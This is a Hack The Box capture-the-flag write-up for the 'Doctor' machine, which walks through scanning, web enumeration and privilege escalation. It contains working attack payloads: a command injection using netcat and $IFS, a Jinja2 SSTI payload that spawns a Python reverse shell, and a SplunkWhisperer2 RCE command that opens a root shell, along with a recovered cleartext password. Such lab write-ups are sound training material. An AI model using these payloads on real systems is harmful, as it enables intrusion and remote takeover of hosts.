![](doctor_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.209 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.209`
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
```
## Splunk

**[Splunk](https://www.splunk.com/) :** software for searching, monitoring, and analyzing machine-generated big data via a Web-style interface.

**Goto :** https://10.10.10.209:8089/ `Splunk Atom Feed: splunkd`

**Access :** Denied, need creds to access `services`

**Version :** server has Splunk build: 8.0.5 

**vulnerability :** [Abusing-Splunk-Forwarders](https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2)

**Exploit :** [PySplunkWhisperer](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)

*Exploit requires creds*

## Web_server

- going through webserver on port `80` first thing i notice is a email address,

	  info@doctors.htb
	 
- I add domain `doctors.htb` from that email to `/etc/hosts` and check i there is any diffrence .
- **goto** `doctors.htb` redirected to `http://doctors.htb/login?next=%2F` and land on a login page .

### Enumerating doctors.htb

- try default logins or some injection on login page but got nothing .
- in the top right corner there is a Register button .

**Note :** registering a new account only valid for 20 minutes as the domain shows this message after registering account
```
Your account has been created, with a time limit of twenty minutes! 
```
- after login i check pages source codes and found a comment

	  <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
	  
- **goto** `http://doctors.htb/archive` got blank page viewing source got `<title>Archive</title>`

- this domain `Doctor Secure Messaging` all about posting staff messages.
- as a loged in user i can post a message, so i create a new message.
- my post is on `http://doctors.htb/post/2` 
- this shows `post/2` but this is my first post, i check first post and this is a post from admin and nothing intrested here.
- I also check `/archive` source again and the `<title>` tag now updated with my post title
- try injections on `http://doctors.htb/post/new` page
- i use diffrent injecion payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- found 2 successful injections in `http://doctors.htb/post/new`
    - **CSRF** in `Content` field
    - **SSTI** in `title` field

*I learn Both Attacks from scratch*

*some resources that help me*

**Server-Side Template Injection**

https://www.youtube.com/watch?v=3cT0uE7Y87s

https://portswigger.net/research/server-side-template-injection

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

**Cross-site request forgery**

https://www.youtube.com/watch?v=vRBihr41JTo

https://portswigger.net/web-security/csrf


#### CSRF Test

**Payload** `<a href="http://tun0/test">TestURL</a>`

**Response** `10.10.10.209 - - [05/Nov/2020 15:24:15] "GET /test HTTP/1.1" 200 -`

#### SSTI Test

**Payload** `{{7*7}}`

**Response** in `/archive` page source code `<title>` tag updated as `49`


# User Exploit
*Both injection give shell in the box*

## with CSRF

**Payload :** `http://tun0/$(nc.traditional$IFS-e/bin/sh$IFS'tun0'$IFS'4141')`

- load the payload in Content field and post the message and shell pop in netcat .
- spaces in the code are a problem for the execution of the code,
- thats why i use `$IFS` as this is a space-replacer for Linux Bash .
	- [IFS](https://mywiki.wooledge.org/IFS) : 
	variable is used in shells (Bourne, POSIX, ksh, bash) as the input field separator
	The default value of IFS is space, tab, newline. 

## with SSTI

**Payload :** `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"tun0\",4141));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}`

got that working payload from : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset

- load the payload in title field and post the message than go to `/archive` execute the payload and pop shell in netcat .

### Enumerating web@doctor

- `cat /etc/passwd` shows two users

	  shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
	  splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash

- linpeas script password string in apache2 logs

	  /var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"

- got password rightaway, i tried that password for both users and worked for user `shaun`
	`shaun:Guitar123`

```
shaun@doctor:~$ cat user.txt
cat user.txt
aaaab5f8************************
```

# Local Enumeration

- I alredy found a Auth RCE for [Splunk](README.md#splunk) so first i try to login with these cred in splunk on port 8089
- login successful and i run that [exploit](exploit/SplunkWhisperer2_RCE.py)

# Root Privesc

## SplunkWhisperer RCE

`python SplunkWhisperer2_RCE.py --host 10.10.10.209 --username shaun --password Guitar123 --lhost tun0 --payload 'nc.traditional -e '/bin/sh' tun0 4242'`

- open netcat listener
- The exploit is straightforward and get a direct rootshell on nc listener .
```
root@doctor:/root# cat root.txt
cat root.txt
e03b774e************************
```